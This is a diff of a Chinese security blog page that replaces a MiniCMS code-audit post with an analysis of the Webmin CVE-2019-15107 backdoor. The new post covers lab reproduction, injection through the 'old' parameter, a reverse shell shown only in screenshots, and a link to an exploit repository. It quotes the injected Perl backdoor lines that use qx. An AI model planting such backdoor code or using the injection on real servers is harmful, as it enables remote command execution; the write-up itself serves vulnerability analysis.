@@ -3,21 +3,21 @@
 <head>
     <meta charset="utf-8">
     
-    <title>代码审计 MiniCMS从头开始 | Math &amp; Sec ，HACHp1的个人博客</title>
+    <title>Webmin RCE(CVE-2019-15107)简析 | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="代码审计 MiniCMS从头开始写在之前最近从头开始学习代码审计，准备从开发的眼光入手，至少要熟悉整个框架的执行流程。MiniCMS体积小，代码短小易读，所以首先详细分析其执行流程。通过学习可以大致熟悉MVC框架的构造，对Web server的后台处理有一个基本了解。">
-<meta name="keywords" content="Web安全">
+    <meta name="description" content="Webmin RCE(CVE-2019-15107)简析写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
+<meta name="keywords" content="漏洞分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计 MiniCMS从头开始">
-<meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20190708-MiniCMS.html">
+<meta property="og:title" content="Webmin RCE(CVE-2019-15107)简析">
+<meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20190824-webmin.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="代码审计 MiniCMS从头开始写在之前最近从头开始学习代码审计，准备从开发的眼光入手，至少要熟悉整个框架的执行流程。MiniCMS体积小，代码短小易读，所以首先详细分析其执行流程。通过学习可以大致熟悉MVC框架的构造，对Web server的后台处理有一个基本了解。">
-<meta property="og:image" content="http://120.78.185.175/img/thumbnails/eggs.jpg">
-<meta property="og:updated_time" content="2019-07-12T03:24:00.259Z">
+<meta property="og:description" content="Webmin RCE(CVE-2019-15107)简析写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
+<meta property="og:image" content="http://120.78.185.175/img/thumbnails/planet_red.png">
+<meta property="og:updated_time" content="2019-08-23T16:22:34.266Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="代码审计 MiniCMS从头开始">
-<meta name="twitter:description" content="代码审计 MiniCMS从头开始写在之前最近从头开始学习代码审计，准备从开发的眼光入手，至少要熟悉整个框架的执行流程。MiniCMS体积小，代码短小易读，所以首先详细分析其执行流程。通过学习可以大致熟悉MVC框架的构造，对Web server的后台处理有一个基本了解。">
-<meta name="twitter:image" content="http://120.78.185.175/img/thumbnails/eggs.jpg">
+<meta name="twitter:title" content="Webmin RCE(CVE-2019-15107)简析">
+<meta name="twitter:description" content="Webmin RCE(CVE-2019-15107)简析写在前面 这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。 漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。">
+<meta name="twitter:image" content="http://120.78.185.175/img/thumbnails/planet_red.png">
     
 
     
@@ -197,13 +197,13 @@ ga('send', 'pageview');
 </aside>
 
             
-            <section id="main"><article id="post-代码审计-MiniCMS从头开始" class="article article-type-post" itemscope itemprop="blogPost">
+            <section id="main"><article id="post-Webmin-RCE-CVE-2019-15107-简析" class="article article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
     
         
             
 	
-		<img src="http://120.78.185.175/img/banner/websec.png" class="article-banner" />
+		<img src="http://120.78.185.175/img/banner/paris.jpg" class="article-banner" />
 	
 
 
@@ -220,7 +220,7 @@ ga('send', 'pageview');
                 
     
         <h1 class="article-title" itemprop="name">
-            代码审计 MiniCMS从头开始
+            Webmin RCE(CVE-2019-15107)简析
         </h1>
     
 
@@ -229,8 +229,8 @@ ga('send', 'pageview');
                         
     <div class="article-date">
         <i class="fa fa-calendar"></i>
-        <a href="/posts/Web安全/20190708-MiniCMS.html">
-            <time datetime="2019-07-08T07:15:18.000Z" itemprop="datePublished">2019-07-08</time>
+        <a href="/posts/Web安全/20190824-webmin.html">
+            <time datetime="2019-08-23T16:20:08.000Z" itemprop="datePublished">2019-08-24</time>
         </a>
     </div>
 
@@ -244,7 +244,7 @@ ga('send', 'pageview');
                         
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+        <a class="tag-link" href="/tags/漏洞分析/">漏洞分析</a>
     </div>
 
                     </div>
@@ -257,96 +257,64 @@ ga('send', 'pageview');
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="代码审计-MiniCMS从头开始"><a href="#代码审计-MiniCMS从头开始" class="headerlink" title="代码审计 MiniCMS从头开始"></a>代码审计 MiniCMS从头开始</h1><h2 id="写在之前"><a href="#写在之前" class="headerlink" title="写在之前"></a>写在之前</h2><p>最近从头开始学习代码审计，准备从开发的眼光入手，至少要熟悉整个框架的执行流程。MiniCMS体积小，代码短小易读，所以首先详细分析其执行流程。通过学习可以大致熟悉MVC框架的构造，对Web server的后台处理有一个基本了解。<br><a id="more"></a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MiniCMS是由<a href="https://github.com/bg5sbk" target="_blank" rel="external">达达</a>设计编写的一个针对个人网站设计的微型内容管理系统。它的特点是：</p>
-<ol>
-<li>不需要数据库在支持，只需要一个可以运行PHP的Web环境</li>
-<li>只针对个人网站设计，没有复杂的成员管理和权限设置</li>
-<li>没有分类只有标签，免除发布文章时到底该怎么分类的纠结</li>
-<li>只有“文章”和“页面”两该个系统，没有“评论”、“插件”、“主题”，让你更专注于创造内容</li>
-</ol>
-<p>项目地址：<a href="https://github.com/bg5sbk/MiniCMS" target="_blank" rel="external">https://github.com/bg5sbk/MiniCMS</a></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
-<li>解压</li>
-<li>复制并重命名install.txt为install.php</li>
-<li>在PHP环境下，浏览器打开install.php，填写网站路径、网站名等信息，点击安装即可（此处填写网站信息等可以注入命令造成RCE，但是由于install.php在安装完成后会自动删除，漏洞不可利用，所以并没有太大的威胁）</li>
+			<h1 id="Webmin-RCE-CVE-2019-15107-简析"><a href="#Webmin-RCE-CVE-2019-15107-简析" class="headerlink" title="Webmin RCE(CVE-2019-15107)简析"></a>Webmin RCE(CVE-2019-15107)简析</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
+<li>这个CVE是@Ethan跟的，后来看文章时我觉得很有意思，就跟了一下。</li>
+<li>漏洞是由于黑客修改了SourceForge上的官方包并留下的后门，在github中并没有被污染。</li>
 </ul>
-<h2 id="安装完成后的目录结构"><a href="#安装完成后的目录结构" class="headerlink" title="安装完成后的目录结构"></a>安装完成后的目录结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">│  build.php</div><div class="line">│  index.php 整个项目的入口，首先引入核心库mc-core.php，然后进行路由，对路由结果进行相应的渲染，相当于MVC中的C</div><div class="line">│  install.txt 复制为php文件后，用来安装MiniCMS</div><div class="line">│  README.md</div><div class="line">│</div><div class="line">├─mc-admin 管理功能的实现</div><div class="line">│      conf.php 用户设置页面，包括接收和保存更改的设置</div><div class="line">│      editor.php 编辑器的大小、样式调整的库</div><div class="line">│      foot.php html&lt;foot&gt;标签构造</div><div class="line">│      head.php token验证，html&lt;head&gt;标签构造；若验证失败，跳转至主页</div><div class="line">│      index.php 后台登陆身份验证页面</div><div class="line">│      page-edit.php 页面编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存</div><div class="line">│      page.php 管理页面的库，声明加载数据、删除页面、还原页面（从回收站还原）</div><div class="line">│      post-edit.php 文章编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存</div><div class="line">│      post.php 管理文章的库，声明加载数据、删除文章、还原文章（从回收站还原）</div><div class="line">│      style.css 后台用到的CSS</div><div class="line">│</div><div class="line">└─mc-files</div><div class="line">    │  markdown.php 一个开源的markdown解析库</div><div class="line">    │  mc-conf.php 配置文件，包含用户名和密码等敏感信息</div><div class="line">    │  mc-core.php 引入mc-tags、mc-conf，声明404函数</div><div class="line">    │  mc-rss.php 订阅RSS的链接</div><div class="line">    │  mc-tags.php 相当于M，引入markdown、包括一些核心函数，包括了加载各种信息的函数（网站名、文章数、前进后退等，中间有各种过滤，可以重点分析）</div><div class="line">    │</div><div class="line">    ├─pages</div><div class="line">    │  └─index</div><div class="line">    │          delete.php 使用数组储存了删除页面的信息（id、标题、标签等）与data文件夹内的文章数据一一对应</div><div class="line">    │          draft.php 使用数组储存了草稿页面的信息（id、标题、标签等）与data文件夹内的文章数据一一对应</div><div class="line">    │          publish.php 使用数组储存了已发布的页面的信息（id、标题、标签等）与data文件夹内的文章数据一一对应</div><div class="line">    │</div><div class="line">    ├─posts</div><div class="line">    │  ├─data 储存了文章内容的反序列化数据（文章内容等）</div><div class="line">    │  └─index</div><div class="line">    │          delete.php 使用数组储存了删除的文章的信息（id、标题、标签等）与data文件夹内的文章数据一一对应</div><div class="line">    │          draft.php 使用数组储存了草稿文章的信息（id、标题、标签等）与data文件夹内的文章数据一一对应</div><div class="line">    │          publish.php 使用数组储存了已发布文章的信息（id、标题、标签等）与data文件夹内的文章数据一一对应</div><div class="line">    │</div><div class="line">    └─theme</div><div class="line">            index.php 主题文件，决定了页面的风格，将C传入的信息显示出来，相当于V</div><div class="line">            style.css 主题使用的CSS风格</div></pre></td></tr></table></figure>
-<h2 id="访客端"><a href="#访客端" class="headerlink" title="访客端"></a>访客端</h2><h3 id="路由与控制器-MVC-C"><a href="#路由与控制器-MVC-C" class="headerlink" title="路由与控制器(MVC-C)"></a>路由与控制器(MVC-C)</h3><ul>
-<li>MiniCMS在index.php页面进行简单的正则匹配和字符串对比路由，index.php会取出<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>并进行正则匹配；主要有以下几种路由：<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> preg_match(<span class="string">'|^post/([a-z0-5]&#123;6&#125;)$|'</span>, $qs, $matches) <span class="comment">// 路由至查看文章功能</span></div><div class="line"><span class="number">2.</span> preg_match(<span class="string">'|^tag/([^/]+)/(\?page=([0-9]+))&#123;0,1&#125;$|'</span>, $qs, $matches) <span class="comment">// 路由至查看页面功能</span></div><div class="line"><span class="number">3.</span> preg_match(<span class="string">'|^date/([0-9]&#123;4&#125;-[0-9]&#123;2&#125;)/(\?page=([0-9]+))&#123;0,1&#125;$|'</span>, $qs, $matches) <span class="comment">// 路由至按日期查看文章</span></div><div class="line"><span class="number">4.</span> preg_match(<span class="string">'|^archive/$|'</span>, $qs, $matches) <span class="comment">// 路由至按archive查看文章</span></div><div class="line"><span class="number">5.</span> $qs == <span class="string">'rss/'</span> <span class="comment">// 路由至返回RSS订阅</span></div><div class="line"><span class="number">6.</span> preg_match(<span class="string">'|^(([-a-zA-Z0-5]+/)+)$|'</span>, $qs, $matches) <span class="comment">// 路由至page查看文章</span></div><div class="line"><span class="number">7.</span> <span class="keyword">default</span>:index <span class="comment">// 其他情况，路由至主页</span></div></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul>
+<li><p>Webmin是一个基于Web的界面，用于Unix的系统管理。使用任何支持表和表单的浏览器，可以设置用户帐户，Apache，DNS，文件共享等。</p>
+</li>
+<li><p>2019年8月10日，pentest上发布了Webmin CVE-2019-15107远程代码执行漏洞。</p>
+</li>
+<li><p>该漏洞由于password_change.cgi文件在重置密码功能中存在一个代码执行漏洞，该漏洞允许恶意第三方在缺少输入验证的情况下而执行恶意代码，后经知道创宇404实验室发现，该漏洞的存在实则是SourceForge上某些版本的安装包和源码被植入了后门导致的。</p>
 </li>
 </ul>
-<h3 id="视图-MVC-V"><a href="#视图-MVC-V" class="headerlink" title="视图(MVC-V)"></a>视图(MVC-V)</h3><ul>
-<li>mc_files/theme/index.php文件中，通过<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div class="content"&gt;&lt;?php mc_the_content(); ?&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
+<h2 id="Dockerfile构建"><a href="#Dockerfile构建" class="headerlink" title="Dockerfile构建"></a>Dockerfile构建</h2><ul>
+<li>踩过了一些环境搭建的坑后得到了两大版本的可以复现的dockerfile，直接上地址：<br><a href="https://github.com/HACHp1/webmin_docker_and_exp" target="_blank" rel="external">https://github.com/HACHp1/webmin_docker_and_exp</a></li>
+</ul>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="v1-920"><a href="#v1-920" class="headerlink" title="v1.920"></a>v1.920</h3><p>首先在v1.920版本复现：<br>使用用户名：root，密码：pass登陆；之后进入webmin权限设置界面:</p>
+<p><img src="http://120.78.185.175/img/blogimg/webmin/1.png" alt=""></p>
+<p>将提醒用户修改过期密码提示打钩并保存：<br><img src="http://120.78.185.175/img/blogimg/webmin/2.png" alt=""></p>
+<p>待webmin重启后，进入webmin user界面添加新用户（新建用户后登陆新用户才会进入修改密码界面）：<br><img src="http://120.78.185.175/img/blogimg/webmin/3.png" alt=""></p>
+<p>勾选强制修改选项：<br><img src="http://120.78.185.175/img/blogimg/webmin/4.png" alt=""></p>
+<p>注销当前用户，登陆新用户，此时会要求修改密码：<br><img src="http://120.78.185.175/img/blogimg/webmin/5.png" alt=""></p>
+<p>截包，可以在old参数注入命令：<br><img src="http://120.78.185.175/img/blogimg/webmin/6.png" alt=""></p>
+<p>反弹shell：<br><img src="http://120.78.185.175/img/blogimg/webmin/7.png" alt=""></p>
+<h3 id="v1-890"><a href="#v1-890" class="headerlink" title="v1.890"></a>v1.890</h3><p>在@Ethan搜寻漏洞成因的过程中，发现在版本v1.890中有明显的后门代码，可以直接通过expired参数执行命令，在post参数中仅添加expired参数就能够执行命令（我直接写的脚本，就不截图了）。</p>
+<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><ul>
+<li>根据复现情况很容易可以写出EXP：<a href="https://github.com/HACHp1/webmin_docker_and_exp" target="_blank" rel="external">https://github.com/HACHp1/webmin_docker_and_exp</a></li>
+</ul>
+<h2 id="漏洞原理以及修复方案分析"><a href="#漏洞原理以及修复方案分析" class="headerlink" title="漏洞原理以及修复方案分析"></a>漏洞原理以及修复方案分析</h2><p>既然是后门，调用起来就比较容易，执行过程也比较好分析。</p>
+<h3 id="v1-890-1"><a href="#v1-890-1" class="headerlink" title="v1.890"></a>v1.890</h3><ul>
+<li>通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门：</li>
+</ul>
+<p><img src="http://120.78.185.175/img/blogimg/webmin/8.png" alt=""></p>
+<ul>
+<li>在后门版本中，后门执行代码为：<code>$in{&#39;expired&#39;} eq &#39;&#39; || die $text{&#39;password_expired&#39;},qx/$in{&#39;expired&#39;}/;</code>，代码使用qx直接执行了expired参数。而正常版本中，此处只是提示密码修改模式未开启：<code>$miniserv{&#39;passwd_mode&#39;} == 2 || die &quot;Password changing is not enabled!&quot;;</code>。并且在之前没有任何if逻辑，使此处的RCE不需要其他条件便能执行（而在1.9x中，需要一些条件才能执行到系统命令）。</li>
+</ul>
+<h3 id="v1-920-1"><a href="#v1-920-1" class="headerlink" title="v1.920"></a>v1.920</h3><ul>
+<li><p>类似1.890版本，通过对比SourceForge上的污染版本和未污染的github版本，可以发现明显的后门：<br><img src="http://120.78.185.175/img/blogimg/webmin/9.png" alt=""></p>
+</li>
+<li><p>但是在1.920版本中，由于执行条件的问题，默认配置不能RCE；一般来讲，攻击者都是要使利用面尽可能的广的，但是此处攻击者的做法却使攻击成功的可能性大大降低，可能是由于攻击者自身对webmin的执行过程不熟悉，认为执行条件是默认条件而产生疏忽所致。</p>
+</li>
+<li><p>代码执行主要流程如下：<br>首先，在第12行需要<code>passwd_mode</code>为2，也就是之前复现中的”将提醒用户修改过期密码提示打钩并保存”这步会将其设置为2。由于webmin默认并不会设置其为2，这一步就会使绝大多数受害机不会遭受RCE。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$miniserv&#123;<span class="string">'passwd_mode'</span>&#125; == <span class="number">2</span> || <span class="keyword">die</span> <span class="string">"Password changing is not enabled!"</span>;</div></pre></td></tr></table></figure>
+</li>
+<li><p>此外，根据以下代码中的<code>if ($wuser-&gt;{&#39;pass&#39;} eq &#39;x&#39;)</code>可知，如果user是unix的权限用户（root），则将其复制为<code>undef</code>，此时将不会进入后门触发处，所以在利用后门时，需要使用非root的用户。</p>
 </li>
 </ul>
-<p>直接渲染路由到的内容。</p>
-<ul>
-<li>通过mc-files/theme/style.css修改主页的CSS风格。</li>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Is this a Webmin user?</span></div><div class="line"><span class="keyword">if</span> (&amp;foreign_check(<span class="string">"acl"</span>)) &#123;</div><div class="line">	&amp;foreign_require(<span class="string">"acl"</span>, <span class="string">"acl-lib.pl"</span>);</div><div class="line">	($wuser) = <span class="keyword">grep</span> &#123; $_-&gt;&#123;<span class="string">'name'</span>&#125; eq $in&#123;<span class="string">'user'</span>&#125; &#125; &amp;acl::list_users();</div><div class="line">	<span class="keyword">if</span> ($wuser-&gt;&#123;<span class="string">'pass'</span>&#125; eq <span class="string">'x'</span>) &#123;</div><div class="line">		<span class="comment"># A Webmin user, but using Unix authentication</span></div><div class="line">		$wuser = <span class="keyword">undef</span>;</div><div class="line">		&#125;</div><div class="line">	<span class="keyword">elsif</span> ($wuser-&gt;&#123;<span class="string">'pass'</span>&#125; eq <span class="string">'*LK*'</span> ||</div><div class="line">	       $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; =~ <span class="regexp">/^\!/</span>) &#123;</div><div class="line">		&amp;pass_error(<span class="string">"Webmin users with locked accounts cannot change "</span>.</div><div class="line">		       	    <span class="string">"their passwords!"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="keyword">if</span> (!$in&#123;<span class="string">'pam'</span>&#125; &amp;&amp; !$wuser) &#123;</div><div class="line">	$miniserv&#123;<span class="string">'passwd_cindex'</span>&#125; <span class="keyword">ne</span> <span class="string">''</span> &amp;&amp; $miniserv&#123;<span class="string">'passwd_mindex'</span>&#125; <span class="keyword">ne</span> <span class="string">''</span> || </div><div class="line">		<span class="keyword">die</span> <span class="string">"Missing password file configuration"</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($wuser) &#123;</div><div class="line">	<span class="comment"># Update Webmin user's password</span></div><div class="line">	$enc = &amp;acl::encrypt_password($in&#123;<span class="string">'old'</span>&#125;, $wuser-&gt;&#123;<span class="string">'pass'</span>&#125;);</div><div class="line">	$enc eq $wuser-&gt;&#123;<span class="string">'pass'</span>&#125; || &amp;pass_error($text&#123;<span class="string">'password_eold'</span>&#125;,<span class="keyword">qx</span>/$in&#123;<span class="string">'old'</span>&#125;/);</div><div class="line">	$perr = &amp;acl::check_password_restrictions($in&#123;<span class="string">'user'</span>&#125;, $in&#123;<span class="string">'new1'</span>&#125;);</div><div class="line">	$perr &amp;&amp; &amp;pass_error(&amp;text(<span class="string">'password_enewpass'</span>, $perr));</div><div class="line">	$wuser-&gt;&#123;<span class="string">'pass'</span>&#125; = &amp;acl::encrypt_password($in&#123;<span class="string">'new1'</span>&#125;);</div><div class="line">	$wuser-&gt;&#123;<span class="string">'temppass'</span>&#125; = <span class="number">0</span>;</div><div class="line">	&amp;acl::modify_user($wuser-&gt;&#123;<span class="string">'name'</span>&#125;, $wuser);</div><div class="line">	&amp;reload_miniserv();</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>此CVE是由黑客以某种方式篡改了webmin的官方SourceForge代码而写入的后门。</li>
+<li>整个后门的逻辑比较简单，分析过程也比较顺利。</li>
+<li>在后门追踪的过程中，可以体会到很多技术以外的东西以及当年最初接触到黑客文化的一种侠义感（:)开始吹比）；第一次接触到代码跟踪，在过程中学到了一些东西。</li>
 </ul>
-<h3 id="模型-MVC-M"><a href="#模型-MVC-M" class="headerlink" title="模型(MVC-M)"></a>模型(MVC-M)</h3><ul>
-<li>模型M相关的功能主要在 mc-files/mc-tags.php中实现。<br>主要函数有：</li>
-</ul>
-<ol>
-<li>mc_site_name 获取网站名</li>
-<li>mc_site_desc 获取网站标题后缀</li>
-<li>mc_site_link 获取网站链接</li>
-<li>mc_nick_name 获取昵称</li>
-<li>mc_theme_url 获取主题文件路径</li>
-<li>mc_is_post 返回路由是否是post</li>
-<li>mc_is_page 返回路由是否是page</li>
-<li>mc_is_tag 返回路由是否是tag</li>
-<li>mc_is_date 返回路由是否是date</li>
-<li>mc_is_archive 返回路由是否是archive</li>
-<li>mc_tag_name 获取标签名</li>
-<li>mc_date_name 获取日期</li>
-<li>mc_has_new 获取是否有更新的页面（页面底部的页数）</li>
-<li>mc_has_old 获取是否有更早的页面（页面底部的页数）</li>
-<li>mc_goto_old 打印输出更早页面的超链接</li>
-<li>mc_goto_new 打印输出更晚页面的超链接</li>
-<li>mc_date_list 打印输出日期列表</li>
-<li>mc_tag_list 打印输出标签列表</li>
-<li>mc_next_post 判断是否有下一个post</li>
-<li>mc_the_title 打印输出标题</li>
-<li>mc_the_date 打印输出日期</li>
-<li>mc_the_time 打印输出时间</li>
-<li>mc_the_tags 打印输出标签</li>
-<li>mc_the_content 打印输出主要内容（文章、页面）</li>
-<li>mc_the_link 打印输出超链接和其标题</li>
-<li>mc_the_url 打印输出url的超链接</li>
-<li>mc_can_comment 返回是否能够评论</li>
-<li>mc_comment_code 获取填入的第三方评论代码</li>
-</ol>
-<h2 id="后台管理端"><a href="#后台管理端" class="headerlink" title="后台管理端"></a>后台管理端</h2><p>后台管理端直接用代码按功能写入文件，各文件的功能如下：</p>
-<ul>
-<li>conf.php 用户设置页面，包括接收和保存更改的设置</li>
-<li>editor.php 编辑器的大小、样式调整的库</li>
-<li>foot.php html<foot>标签构造</foot></li>
-<li>head.php token验证，html<head>标签构造；若验证失败，跳转至主页</head></li>
-<li>index.php 后台登陆身份验证页面</li>
-<li>page-edit.php 页面编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存</li>
-<li>page.php 管理页面的库，声明加载数据、删除页面、还原页面（从回收站还原）</li>
-<li>post-edit.php 文章编写处理逻辑，包括显示编辑页面、接收提交的页面、页面序列化储存</li>
-<li>post.php 管理文章的库，声明加载数据、删除文章、还原文章（从回收站还原）</li>
-<li>style.css 后台用到的CSS</li>
-</ul>
-<h2 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h2><p>在MiniCMS公开期间，爆出了多个CVE漏洞，并且至今未修复，主要如下（按时间先后顺序排列）： </p>
-<ul>
-<li>CVE-2018-1000638  反射型XSS 存在位置：/MiniCMS-master/mc-admin/page.php处date参数存在XSS漏洞    </li>
-<li>CVE-2018-10227 储存型XSS 存在位置：/MiniCMS-master/MiniCMS-master/mc-admin/conf.php 在设置中修改网站地址处存在XSS漏洞，可直接储存XSS payload   </li>
-<li>CVE-2018-10296 储存型XSS 存在位置： /MiniCMS-master/mc-admin/post-edit.php 编辑文章标题处可直接储存XSS payload    </li>
-<li>CVE-2018-10423 个人认为不是漏洞，只是个BUG，此处的BUG只是网页中的超链接错误地指向了网站根目录，点击后就会去访问网站根目录，这个时候，洞主的apache配置没有关文件遍历，就误认为是CMS的漏洞，显然是不对的，洞主应该是刷分的，没想到竟然过了:)   </li>
-<li>CVE-2018-10424 物理路径泄露  存在位置：/MiniCMS-master/mc-admin/post-edit.php处将GET的参数id改为不存在的文件名，会爆出物理地址    </li>
-<li>CVE-2018-15899 反射型XSS   存在位置：/minicms/mc-admin/page.php的GET参数date存在XSS（似乎与CVE-2018-1000638重复了。。）    </li>
-<li>CVE-2018-16233 反射型XSS   存在位置：/MiniCMS-1.10/mc-admin/post-edit.php处的POST参数tags存在XSS    </li>
-<li>CVE-2018-16298 反射型XSS 存在位置：/MiniCMS-1.10/mc-admin/post.php的GET参数tag存在XSS          </li>
-<li>CVE-2018-17039 反射型XSS 存在位置：/mc-admin/index.php使用任意GET参数并取XSS payload，可在IE浏览器中执行JS   </li>
-<li>CVE-2018-18890 物理路径泄露  存在位置：post.php?delete=qe54cn&amp;state=delete删除不存在的文章时爆出物理路径   </li>
-<li>CVE-2018-18891 部分文件删除（逻辑漏洞，删除操作在身份认证之前进行） 存在位置：/mc-admin/post.php?delete=qe54cn&amp;state=delete不用登陆可直接删除文章   </li>
-<li>CVE-2018-18892 鸡肋的RCE 存在位置： install.php在安装时在配置处可以向配置文件直接注入PHP代码；由于在MiniCMS安装完毕后此文件会自我删除，在实际情况下并没有太大的作用  </li>
-<li>CVE-2018-20520 反射型XSS   存在位置：类似于CVE-2018-17039，/MiniCMS1/mc-admin/post-edit.php使用任意GET参数并取XSS payload，可在IE浏览器中执行JS   </li>
-<li>CVE-2018-9092 CSRF 存在位置： <a href="http://127.0.0.1//MiniCMS/mc-admin/post.php?delete=aaaaaa&amp;state=publish&amp;date=&amp;tag=" target="_blank" rel="external">http://127.0.0.1//MiniCMS/mc-admin/post.php?delete=aaaaaa&amp;state=publish&amp;date=&amp;tag=</a> 此处的CSRF会导致任意文章删除：     </li>
-<li>CVE-2019-9603 CSRF 存在位置：/minicms/mc-admin/conf.php 此处的CSRF会导致任意修改网站配置   </li>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://blog.firosolutions.com/exploits/webmin/" target="_blank" rel="external">https://blog.firosolutions.com/exploits/webmin/</a></li>
+<li><a href="https://www.4hou.com/technology/19803.html" target="_blank" rel="external">https://www.4hou.com/technology/19803.html</a></li>
+<li><a href="https://paper.seebug.org/1019/" target="_blank" rel="external">https://paper.seebug.org/1019/</a></li>
+<li><a href="https://github.com/webmin/webmin/issues/947" target="_blank" rel="external">https://github.com/webmin/webmin/issues/947</a></li>
 </ul>
 
         
@@ -363,7 +331,7 @@ ga('send', 'pageview');
       </li>
       <li class="post-copyright-link">
         <strong>本文链接：</strong>
-        <a href="/posts/Web安全/20190708-MiniCMS.html" title="代码审计 MiniCMS从头开始">https://hachp1.github.io/posts/Web安全/20190708-MiniCMS.html</a>
+        <a href="/posts/Web安全/20190824-webmin.html" title="Webmin RCE(CVE-2019-15107)简析">https://hachp1.github.io/posts/Web安全/20190824-webmin.html</a>
       </li>
       <li class="post-copyright-license">
         <strong>版权声明： </strong>
@@ -428,19 +396,10 @@ window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMin
         
 <nav id="article-nav">
     
-        <a href="/posts/Web安全/20190710-wp511.html" id="article-nav-newer" class="article-nav-link-wrap">
-            <strong class="article-nav-caption">上一篇</strong>
-            <div class="article-nav-title">
-                
-                    WordPress 5.1.1 ，CSRF-&gt;XSS-&gt;RCE漏洞分析
-                
-            </div>
-        </a>
     
-    
-        <a href="/posts/Web安全/20190616-prce.html" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/posts/漏洞分析/20190809-kde45ce.html" id="article-nav-older" class="article-nav-link-wrap">
             <strong class="article-nav-caption">下一篇</strong>
-            <div class="article-nav-title">PRCE 正则最大回溯次数</div>
+            <div class="article-nav-title">CVE-2019-14744 KDE4/5命令执行漏洞简析</div>
         </a>
     
 </nav>
